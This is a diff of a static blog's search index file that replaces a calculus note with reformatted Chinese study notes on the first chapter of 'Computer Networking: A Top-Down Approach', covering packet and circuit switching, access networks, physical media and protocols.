@@ -1,618 +1,309 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>求斜渐近线</title>
-    <url>/2022/01/10/math/</url>
-    <content><![CDATA[<script type="math/tex; mode=display">
-如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr>
-<script type="math/tex; mode=display">
-求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
+      <link href="/2022/01/22/read-1-3/"/>
+      <url>/2022/01/22/read-1-3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p><h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul><li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li><li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li></ul><h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul><li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li><li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li></ul><h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul><li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li><li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li><li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li></ul><h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul><li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li><li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li><li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li></ul><h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul><li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p></li><li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p></li><li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p><p><img src="/2022/01/22/read-1-3/1.png" alt></p></li><li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p></li></ul><h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
+      
+      
       <categories>
-        <category>高数笔记</category>
+          
+          <category> 学习笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>math</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
-    <url>/2022/01/22/read-1-3/</url>
-    <content><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p>
-<h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul>
-<li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li>
-<li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li>
-</ul>
-<h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul>
-<li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li>
-<li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li>
-</ul>
-<h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul>
-<li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li>
-<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li>
-<li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li>
-</ul>
-<h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul>
-<li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li>
-<li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li>
-<li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li>
-</ul>
-<h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul>
-<li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p>
-</li>
-<li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p>
-</li>
-<li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p>
-<p><img src="/2022/01/22/read-1-3/1.png" alt></p>
-</li>
-<li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p>
-</li>
-</ul>
-<h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
+      
+      
+        <tags>
+            
+            <tag> read </tag>
+            
+            <tag> learn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《计算机网络自顶向下方法》（计算机网络和因特网）（2）</title>
+      <link href="/2022/01/11/read-1.2/"/>
+      <url>/2022/01/11/read-1.2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x02-网络边缘"><a href="#0x02-网络边缘" class="headerlink" title="0x02 网络边缘"></a>0x02 网络边缘</h1><p>回想前一节计算机网络的术语，通常把与因特网相连的计算机和其他设备成为端系统，之所以称为端系统，因为它们位于因特网的边缘</p><p>端系统也称为<u>主机（host）</u>，因为它们容纳（即运行）应用程序</p><p>主机有时又被进一步划分为两类：<strong>客户（client）</strong>和<strong>服务器（server）</strong>，客户通常是桌面PC、智能手机等，而服务器通常是更为强大的机器，用于存储和发布Web页面、流视频、中继电子邮件等</p><h2 id="一、接入网"><a href="#一、接入网" class="headerlink" title="一、接入网"></a>一、接入网</h2><p><strong>接入网</strong>指将端系统物理连接到其<strong>边缘路由器（edge router）</strong>的网络</p><p>边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器</p><h3 id="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"><a href="#1、家庭接入：DSL、电缆、FTTH、拨号和卫星" class="headerlink" title="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"></a>1、家庭接入：DSL、电缆、FTTH、拨号和卫星</h3><ul><li><p>宽带住宅接入有两种最流行的类型：<strong>数字用户线（Digital Subscriber Line，DSL）</strong>和电缆</p><span id="more"></span><ul><li><p>每个用户的DSL调制解调器使用现有的电话线与位于电话公司的本地中心局（CO）中的数字用户线接入<u>复用器（DSLAM）</u>交换数据</p></li><li><p>家庭的DSL调制解调器得到数字数据后将其转换为高频音，以通过电话线传输给本地中心局，然后在DSLAM处被转换回数字形式</p></li><li><p>家庭电话线用不同的频率进行编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高速下行信道，位于50kHz到1MHz频段</span><br><span class="line">中速上行信道，位于4kHz到50kHz频段</span><br><span class="line">普通的双向电话信道，位于0到4kHz频段</span><br></pre></td></tr></table></figure></li><li><p>用户一侧，一个分配器把到达家庭的数据信号和电话信号分隔开，并将数据信号转发给DSL调制解调器；电话公司一侧，在本地中心局，DSLAM把数据和电话信号分隔开，并将数据发给因特网</p><p><img src="/2022/01/11/read-1.2/1.png" alt></p></li></ul></li><li><p>DSL利用电话公司现有的本地电话基础设施，而<strong>电缆因特网接入（cable Internet access）</strong>利用了有线电视公司现有的有线电视基础设施</p><ul><li><p>电缆因特网接入需要特殊的调制解调器，称为<u>电缆调制解调器（cable modem）</u>,它通常通过一个以太网端口连接到家庭PC</p></li><li><p>在电缆头端，<u>电缆调制解调器端接系统（Cable Modem Termination System，CMTS）</u>与DSL网络的DSLAM具有类似的功能，即将来自许多下行家庭中的电缆调制解调器发送的模拟信号转换回数字形式</p><p><img src="/2022/01/11/read-1.2/2.png" alt></p></li><li><p>如同DSL，上行信道分配的传输速率通常比下行信道的稿</p></li><li><p>电缆因特网接入的一个重要特征是共享广播媒体</p></li></ul></li><li><p>提供更高速率的新兴技术是<strong>光纤到户（Fiber To The Home，FTTH）</strong></p><ul><li><p>顾名思义，FTTH就是从本地中心局直接到家庭提供了一条光纤路径</p></li><li><p>从中心局出来的每根光纤实际上由许多家庭共享，直到相对接近这些家庭的位置，改光纤才分成每户一根光纤。进行这种分配由两种光纤分布体系结构：<u>有源光纤网络（Active Optical Network，AON）</u>和<u>无源光纤网络（Passive Optical Network，PON）</u></p><ol><li><p>AON：AON本质上就是交换以太网</p></li><li><p>PON：每个家庭具有一个<u>光纤网络端接器（Optical Network Terminator，ONT）</u>，它由专门的光纤连接到邻近的<u>分配器（splitter）</u>。分配器把一些家庭集结到一根共享的光纤，该光纤再连接到本地电话和公司的中心局中的<u>光纤线路端接器（Optical Line Terminator，OLT）</u>。OLT提供了光信号和电信号的转换，经过本地电话公司路由器与因特网相连。在家庭中，用户将一台家庭路由器与ONT相连，并经过这台家庭路由器接入因特网：</p><p><img src="/2022/01/11/read-1.2/3.png" alt></p></li></ol></li></ul></li></ul><h3 id="2、企业（和家庭）接入：以太网和WiFi"><a href="#2、企业（和家庭）接入：以太网和WiFi" class="headerlink" title="2、企业（和家庭）接入：以太网和WiFi"></a>2、企业（和家庭）接入：以太网和WiFi</h3><ul><li><p>在越来越多的环境里，使用<u>局域网（LAN）</u>将端系统连接到边缘路由器</p></li><li><p>到目前为止，以太网是公司、大学和家庭网络中最为流行的接入技术</p><p><img src="/2022/01/11/read-1.2/4.png" alt></p></li><li><p>在无线LAN环境中，无线用户从一个接入点 发送 / 接收 分组，该接入点与企业网相连，企业网再与有线因特网相连。基于IEEE 802.11技术的无线LAN接入，更通俗地称为WiFi，目前几乎无所不在</p></li><li><p>今天许多家庭将宽带住宅接入（即电缆调制解调器或DSL）与廉价的无线局域网技术结合起来，以产生强大的家用网络</p><p><img src="/2022/01/11/read-1.2/5.png" alt></p></li></ul><h3 id="3、广域无线接入：3G和LTE"><a href="#3、广域无线接入：3G和LTE" class="headerlink" title="3、广域无线接入：3G和LTE"></a>3、广域无线接入：3G和LTE</h3><ul><li>iPhone和安卓等设备应用了与蜂窝移动电话相同的无线基础设施，通过蜂窝网提供商运营的基站来发送和接收分组</li><li>电信公司已经在第三代无线技术（3G）中进行了大量投资，3G为分组交换广域无线因特网接入提供了超过1Mbps的速率</li><li>而如今第四代（4G）已经全面覆盖，第五代（5G）也开始了部署</li></ul><h2 id="二、物理媒体"><a href="#二、物理媒体" class="headerlink" title="二、物理媒体"></a>二、物理媒体</h2><p>考虑一个比特从一个端系统开始传输，通过一系列链路和路由器，到达另一个端系统。这个比特当从源到目的地传输时，通过一系列 “发射器 - 接收器” 对，对于每个发射器 - 接收器对，通过跨越一种<strong>物理媒体（physical medium）</strong>传播电磁波或光脉冲来发送该比特。</p><ul><li>物理媒体分成两种类型：<strong>导引型媒体（guided media）</strong>和<strong>非导引型媒体（unguided media）</strong><ol><li>导引型媒体，电波沿着固体媒体前行，如光缆、双绞铜线或同轴电缆</li><li>非导引型媒体，电波在空气或外层空间中传播，例如在无线局域网或数字卫星频道中</li></ol></li></ul><h3 id="1、双绞铜线"><a href="#1、双绞铜线" class="headerlink" title="1、双绞铜线"></a>1、双绞铜线</h3><ul><li>最便宜并且最为常用的导引型传输媒体</li><li>双绞线由两根绝缘的铜线组成，以规则的螺旋状排列着</li><li><strong>无屏蔽双绞线（Unshielded Twisted Pair，UTP）</strong>常用在建筑物内的计算机网络中，即用于局域网（LAN）中</li><li>目前局域网中的双绞线的数据传输速率从10Mbps导10Gbps，所能达到的数据传输速率取决于线的粗细以及传输方和接收方之间的距离</li></ul><h3 id="2、同轴电缆"><a href="#2、同轴电缆" class="headerlink" title="2、同轴电缆"></a>2、同轴电缆</h3><ul><li>与双绞线类似，由两个铜导体组成但是这两个导体是同心的而不是并行的，借助这种结构及特殊的绝缘体和保护层，同轴电缆能够达到较高的数据传输速率</li><li>同轴电缆能被用作导引型<strong>共享媒体（shared medium）</strong>，特别是，许多端系统能够直接与该电缆相连，每个端系统都能接收由其他端系统发送的内容</li></ul><h3 id="3、光纤"><a href="#3、光纤" class="headerlink" title="3、光纤"></a>3、光纤</h3><ul><li>光纤是一种细而柔软的、能够导引光脉冲的媒体，每个脉冲表示一个比特</li><li>一根光纤能够支持极高的比特速率，高达数十甚至数百Gbps</li><li>它们不受电磁干扰，信号衰减极低，成为长途导引型传输媒体，特别是跨海链路</li></ul><h3 id="4、陆地无线电信道"><a href="#4、陆地无线电信道" class="headerlink" title="4、陆地无线电信道"></a>4、陆地无线电信道</h3><ul><li>无线电信道承载电磁频谱中的信号</li><li>它能穿透墙壁，因此极大依赖传播环境和信号传输的距离：<ol><li>路径损耗和遮挡衰落（信号跨距离传播和穿过阻碍物体时信号强度降低）</li><li>多径衰落（干扰对象的信号反射）</li><li>干扰（其他传输或电磁信号）</li></ol></li><li>陆地无线电信道大致分为三类：一类运行在很短距离（如1m或2m）；另一类运行在局域，通常跨越数十到几百米；第三类运行在广域，跨越数万米</li></ul><h3 id="5、卫星无线电信道"><a href="#5、卫星无线电信道" class="headerlink" title="5、卫星无线电信道"></a>5、卫星无线电信道</h3><p>一颗通信卫星连接地球上的两个或多个微波发射器/接收器，它们被称为地面站。该卫星在一个频段上接收传输，使用一个转发器再生信号，并在另一个频率上发射信号。通信中尝试用两类卫星：<strong>同步卫星（geostationary satellite）</strong>和<strong>近地轨道（Low-Earth Orbiting，LEO）</strong>卫星。</p>]]></content>
+      
+      
       <categories>
-        <category>学习笔记</category>
+          
+          <category> 读书笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>read</tag>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（1）</title>
-    <url>/2022/01/11/read-1.1/</url>
-    <content><![CDATA[<h1 id="0x01-什么是因特网？"><a href="#0x01-什么是因特网？" class="headerlink" title="0x01 什么是因特网？"></a>0x01 什么是因特网？</h1><h2 id="1-1-具体构成描述"><a href="#1-1-具体构成描述" class="headerlink" title="1.1 具体构成描述"></a>1.1 具体构成描述</h2><p>因特网是一个世界范围    的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p>
-<p>​        不久之前，这些计算设备大多数传统PC、服务器等等，然而现在有越来越多的非传统因特网设备与因特网相连，如智能手机、电视、游戏机、家用电器、手表等。</p>
-<p>用因特网术语来说，这些设备都成为<strong>主机（host）</strong>或者<strong>端系统（end system）</strong></p>
-<span id="more"></span>
-<ul>
-<li>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接到一起</li>
-<li>一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包成为<strong>分组（packet）</strong></li>
-<li>分组交换机：当今最著名的两种类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong></li>
-<li>从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机成为通过该网络的<strong>路径（path）</strong></li>
-<li>端系统通过<strong>因特网服务提供商（Internet Service Provider，ISP）</strong>接入因特网<ul>
-<li>每个 ISP 自身就是一个由多台分组交换机和多段通信链路组成的网络</li>
-<li>各 ISP 为端系统提供了各种不同类型的网络接入</li>
-<li>ISP 也为内容提供者提供因特网接入服务，将Web站点和视频服务器直接连入因特网</li>
-<li>因特网就是将端系统彼此互联，因此为端系统提供接入服务的 ISP 也必须互联</li>
-</ul>
-</li>
-<li>端系统、分组交换机和其他因特网部件都要运行一系列<strong>协议（protocol）</strong>，这些协议控制因特网中信息的接收和发送</li>
-<li><strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet protocol，国际协议）</strong>是因特网中两个最为重要的协议<ul>
-<li>IP 协议定义了在路由器和端系统之间发送和接收的分组格式</li>
-<li>因特网的主要协议统称为 <strong>TCP</strong>/<strong>IP</strong> </li>
-</ul>
-</li>
-</ul>
-<h2 id="1-2-服务描述"><a href="#1-2-服务描述" class="headerlink" title="1.2 服务描述"></a>1.2 服务描述</h2><p>​        从为应用程序提供服务的基础设施的角度来描述因特网</p>
-<p>​        因特网应用包括移动智能手机和平板电脑应用程序，其中包括即时讯息、来自云的音乐流、电影和电视流、在线社交网络以及多人游戏，因为这些应用程序涉及多个交换数据端系统，故它们被称为<strong>分布式应用程序（distributed application）</strong></p>
-<p>​        运行在不同端系统上的软件需要互相发送数据，此时我们碰到一个核心问题：运行在一个端系统上的应用程序怎样才能指令因特网向运行在另一个端系统上的软件发送数据呢？</p>
-<p>​        与因特网相连的端系统提供了一个<strong>套接字接口（socket interface）</strong>，该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式</p>
-<p>通俗来讲它就是一套发送程序必须遵循的规则集合，因此因特网能够将数据交付给目的地</p>
-<p>这种规则就像你寄信需要遵循的规则，邮政服务有自己的“邮政服务接口”或一套规则，你必须遵循，这样邮政服务才能将信件成功送达。同理，因特网也有一个发送数据的程序必须遵循的套接字接口，使因特网向接收数据的程序交付数据</p>
-<h2 id="1-3-什么是协议？"><a href="#1-3-什么是协议？" class="headerlink" title="1.3 什么是协议？"></a>1.3 什么是协议？</h2><h3 id="1-3-1-人类活动的类比"><a href="#1-3-1-人类活动的类比" class="headerlink" title="1.3.1 人类活动的类比"></a>1.3.1 人类活动的类比</h3><p>​        人类协议要求一方首先进行问候（如：你好），以开始与另一个人的通信。对 “你好” 的典型响应是返回一个 ”你好“ 报文，此时发话者可以继续向此人进行提问。而如果对 ”你好“ 的响应是 ”我没空“ 或某些不合时宜的回答，这就表明了一个勉强的或不能进行的通信，在此情况下，按照人类协议，发话者就不能再继续提问了。显然，发送和接收的报文、以及这些报文发送和接收所采取的动作，这些在一个人类协议中起到了核心作用。</p>
-<p>​        如果人们使用不同的协议（例如：一人理解这句话的意思，但另一人不理解），这些协议就不能交互，因而不能完成有用的工作。在网络中这个道理同样成立，即为了完成一项工作，要求两个（或多个）通信实体运行相同的协议。</p>
-<h3 id="1-3-2-网络协议"><a href="#1-3-2-网络协议" class="headerlink" title="1.3.2 网络协议"></a>1.3.2 网络协议</h3><p>​        网络协议类似于人类协议，除了交换报文和采取动作的实体是某些设备（计算机、智能手机、路由器等）的硬件或软件组件</p>
-<p>​        当你向一个Web服务器发出请求（即你在Web服务器中键入一个网页的URL），首先、你的计算机将向该Web服务器发送一条连接请求报文，并等待应答。若该Web服务器最终能接收到连接请求报文，就会返回一条连接响应报文。得知请求Web文档正常以后，计算机则在一条GET报文中发送要从这台web服务器上取回的网页名字。最后、web服务器向计算机返回该web网页（文件）。</p>
-<p>​        <strong>协议（protocol）</strong>定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送 和/或 接收一条报文或其他事件所采取的动作。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> read </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《计算机网络自顶向下方法》（计算机网络和因特网）（1）</title>
+      <link href="/2022/01/11/read-1.1/"/>
+      <url>/2022/01/11/read-1.1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-什么是因特网？"><a href="#0x01-什么是因特网？" class="headerlink" title="0x01 什么是因特网？"></a>0x01 什么是因特网？</h1><h2 id="1-1-具体构成描述"><a href="#1-1-具体构成描述" class="headerlink" title="1.1 具体构成描述"></a>1.1 具体构成描述</h2><p>因特网是一个世界范围    的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p><p>​        不久之前，这些计算设备大多数传统PC、服务器等等，然而现在有越来越多的非传统因特网设备与因特网相连，如智能手机、电视、游戏机、家用电器、手表等。</p><p>用因特网术语来说，这些设备都成为<strong>主机（host）</strong>或者<strong>端系统（end system）</strong></p><span id="more"></span><ul><li>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接到一起</li><li>一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包成为<strong>分组（packet）</strong></li><li>分组交换机：当今最著名的两种类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong></li><li>从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机成为通过该网络的<strong>路径（path）</strong></li><li>端系统通过<strong>因特网服务提供商（Internet Service Provider，ISP）</strong>接入因特网<ul><li>每个 ISP 自身就是一个由多台分组交换机和多段通信链路组成的网络</li><li>各 ISP 为端系统提供了各种不同类型的网络接入</li><li>ISP 也为内容提供者提供因特网接入服务，将Web站点和视频服务器直接连入因特网</li><li>因特网就是将端系统彼此互联，因此为端系统提供接入服务的 ISP 也必须互联</li></ul></li><li>端系统、分组交换机和其他因特网部件都要运行一系列<strong>协议（protocol）</strong>，这些协议控制因特网中信息的接收和发送</li><li><strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet protocol，国际协议）</strong>是因特网中两个最为重要的协议<ul><li>IP 协议定义了在路由器和端系统之间发送和接收的分组格式</li><li>因特网的主要协议统称为 <strong>TCP</strong>/<strong>IP</strong> </li></ul></li></ul><h2 id="1-2-服务描述"><a href="#1-2-服务描述" class="headerlink" title="1.2 服务描述"></a>1.2 服务描述</h2><p>​        从为应用程序提供服务的基础设施的角度来描述因特网</p><p>​        因特网应用包括移动智能手机和平板电脑应用程序，其中包括即时讯息、来自云的音乐流、电影和电视流、在线社交网络以及多人游戏，因为这些应用程序涉及多个交换数据端系统，故它们被称为<strong>分布式应用程序（distributed application）</strong></p><p>​        运行在不同端系统上的软件需要互相发送数据，此时我们碰到一个核心问题：运行在一个端系统上的应用程序怎样才能指令因特网向运行在另一个端系统上的软件发送数据呢？</p><p>​        与因特网相连的端系统提供了一个<strong>套接字接口（socket interface）</strong>，该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式</p><p>通俗来讲它就是一套发送程序必须遵循的规则集合，因此因特网能够将数据交付给目的地</p><p>这种规则就像你寄信需要遵循的规则，邮政服务有自己的“邮政服务接口”或一套规则，你必须遵循，这样邮政服务才能将信件成功送达。同理，因特网也有一个发送数据的程序必须遵循的套接字接口，使因特网向接收数据的程序交付数据</p><h2 id="1-3-什么是协议？"><a href="#1-3-什么是协议？" class="headerlink" title="1.3 什么是协议？"></a>1.3 什么是协议？</h2><h3 id="1-3-1-人类活动的类比"><a href="#1-3-1-人类活动的类比" class="headerlink" title="1.3.1 人类活动的类比"></a>1.3.1 人类活动的类比</h3><p>​        人类协议要求一方首先进行问候（如：你好），以开始与另一个人的通信。对 “你好” 的典型响应是返回一个 ”你好“ 报文，此时发话者可以继续向此人进行提问。而如果对 ”你好“ 的响应是 ”我没空“ 或某些不合时宜的回答，这就表明了一个勉强的或不能进行的通信，在此情况下，按照人类协议，发话者就不能再继续提问了。显然，发送和接收的报文、以及这些报文发送和接收所采取的动作，这些在一个人类协议中起到了核心作用。</p><p>​        如果人们使用不同的协议（例如：一人理解这句话的意思，但另一人不理解），这些协议就不能交互，因而不能完成有用的工作。在网络中这个道理同样成立，即为了完成一项工作，要求两个（或多个）通信实体运行相同的协议。</p><h3 id="1-3-2-网络协议"><a href="#1-3-2-网络协议" class="headerlink" title="1.3.2 网络协议"></a>1.3.2 网络协议</h3><p>​        网络协议类似于人类协议，除了交换报文和采取动作的实体是某些设备（计算机、智能手机、路由器等）的硬件或软件组件</p><p>​        当你向一个Web服务器发出请求（即你在Web服务器中键入一个网页的URL），首先、你的计算机将向该Web服务器发送一条连接请求报文，并等待应答。若该Web服务器最终能接收到连接请求报文，就会返回一条连接响应报文。得知请求Web文档正常以后，计算机则在一条GET报文中发送要从这台web服务器上取回的网页名字。最后、web服务器向计算机返回该web网页（文件）。</p><p>​        <strong>协议（protocol）</strong>定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送 和/或 接收一条报文或其他事件所采取的动作。</p>]]></content>
+      
+      
       <categories>
-        <category>读书笔记</category>
+          
+          <category> 读书笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>read</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（2）</title>
-    <url>/2022/01/11/read-1.2/</url>
-    <content><![CDATA[<h1 id="0x02-网络边缘"><a href="#0x02-网络边缘" class="headerlink" title="0x02 网络边缘"></a>0x02 网络边缘</h1><p>回想前一节计算机网络的术语，通常把与因特网相连的计算机和其他设备成为端系统，之所以称为端系统，因为它们位于因特网的边缘</p>
-<p>端系统也称为<u>主机（host）</u>，因为它们容纳（即运行）应用程序</p>
-<p>主机有时又被进一步划分为两类：<strong>客户（client）</strong>和<strong>服务器（server）</strong>，客户通常是桌面PC、智能手机等，而服务器通常是更为强大的机器，用于存储和发布Web页面、流视频、中继电子邮件等</p>
-<h2 id="一、接入网"><a href="#一、接入网" class="headerlink" title="一、接入网"></a>一、接入网</h2><p><strong>接入网</strong>指将端系统物理连接到其<strong>边缘路由器（edge router）</strong>的网络</p>
-<p>边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器</p>
-<h3 id="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"><a href="#1、家庭接入：DSL、电缆、FTTH、拨号和卫星" class="headerlink" title="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"></a>1、家庭接入：DSL、电缆、FTTH、拨号和卫星</h3><ul>
-<li><p>宽带住宅接入有两种最流行的类型：<strong>数字用户线（Digital Subscriber Line，DSL）</strong>和电缆</p>
-<span id="more"></span>
-<ul>
-<li><p>每个用户的DSL调制解调器使用现有的电话线与位于电话公司的本地中心局（CO）中的数字用户线接入<u>复用器（DSLAM）</u>交换数据</p>
-</li>
-<li><p>家庭的DSL调制解调器得到数字数据后将其转换为高频音，以通过电话线传输给本地中心局，然后在DSLAM处被转换回数字形式</p>
-</li>
-<li><p>家庭电话线用不同的频率进行编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">高速下行信道，位于50kHz到1MHz频段</span><br><span class="line">中速上行信道，位于4kHz到50kHz频段</span><br><span class="line">普通的双向电话信道，位于0到4kHz频段</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用户一侧，一个分配器把到达家庭的数据信号和电话信号分隔开，并将数据信号转发给DSL调制解调器；电话公司一侧，在本地中心局，DSLAM把数据和电话信号分隔开，并将数据发给因特网</p>
-<p><img src="/2022/01/11/read-1.2/1.png" alt></p>
-</li>
-</ul>
-</li>
-<li><p>DSL利用电话公司现有的本地电话基础设施，而<strong>电缆因特网接入（cable Internet access）</strong>利用了有线电视公司现有的有线电视基础设施</p>
-<ul>
-<li><p>电缆因特网接入需要特殊的调制解调器，称为<u>电缆调制解调器（cable modem）</u>,它通常通过一个以太网端口连接到家庭PC</p>
-</li>
